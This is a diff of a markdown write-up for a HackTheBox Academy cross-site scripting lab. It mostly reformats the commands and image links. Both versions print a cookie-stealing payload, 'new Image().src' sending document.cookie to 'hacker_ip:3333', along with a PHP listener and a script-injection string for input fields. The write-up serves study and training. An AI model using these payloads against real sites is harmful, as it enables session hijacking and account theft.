@@ -13,30 +13,30 @@ Start the server below, make sure you are connected to the VPN, and access the `
 **Answers:**
 
 First, let's create a server on our machine and prepare a payload for testing input fields on the target site.
->mkdir /tmp/tmpserver
+```mkdir /tmp/tmpserver```
 
->cd /tmp/tmpserver
+```cd /tmp/tmpserver```
 
->nano myscript.js > new Image().src='http://hacker_ip:3333/index.php?c='+document.cookie;
+```nano myscript.js > new Image().src='http://hacker_ip:3333/index.php?c='+document.cookie;```
 
->nano index.php
+```nano index.php```
 
-![tmpserver](https://)
+[tmpserver](https://github.com/saramazal/ethical-hacking-study/blob/main/HackTheBox/HTB-Academy-Cross-Site-Scripting-skills-assessment/images/tmpserver.png)
 
-![php-code](/workspace/ethical-hacking-study/HackTheBox/HTB-Academy-Cross-Site-Scripting-skills-assessment/images/HTB-CROSS_SITE-SCRIPTING-XSS-.png)
+[php-code](https://github.com/saramazal/ethical-hacking-study/blob/main/HackTheBox/HTB-Academy-Cross-Site-Scripting-skills-assessment/images/HTB-CROSS_SITE-SCRIPTING-XSS-.png)
 Let's start your server
 
->sudo php -S 0.0.0.0:3333
+```sudo php -S 0.0.0.0:3333```
 
 Now let's test the input fields on the target site:
 
-`"><script src=http://hacker_ip:3333/myscript.js></script>`
+```"><script src=http://hacker_ip:3333/myscript.js></script>```
 
-![start server](/workspace/ethical-hacking-study/HackTheBox/HTB-Academy-Cross-Site-Scripting-skills-assessment/images/php-server.png)
-![inputs](/workspace/ethical-hacking-study/HackTheBox/HTB-Academy-Cross-Site-Scripting-skills-assessment/images/inputs.png)
+[start server](https://github.com/saramazal/ethical-hacking-study/blob/main/HackTheBox/HTB-Academy-Cross-Site-Scripting-skills-assessment/images/php-server.png)
+[inputs](https://github.com/saramazal/ethical-hacking-study/blob/main/HackTheBox/HTB-Academy-Cross-Site-Scripting-skills-assessment/images/inputs.png)
 Great, it works!
 Let's check our cookie file.
-![cat cookies](/workspace/ethical-hacking-study/HackTheBox/HTB-Academy-Cross-Site-Scripting-skills-assessment/images/cookie.png)
+[cat cookies](https://github.com/saramazal/ethical-hacking-study/blob/main/HackTheBox/HTB-Academy-Cross-Site-Scripting-skills-assessment/images/cookie.png)
 Happy Hacking!
 [My HTB Academy unique referral link >](https://referral.hackthebox.com/mzyGKZb)
 
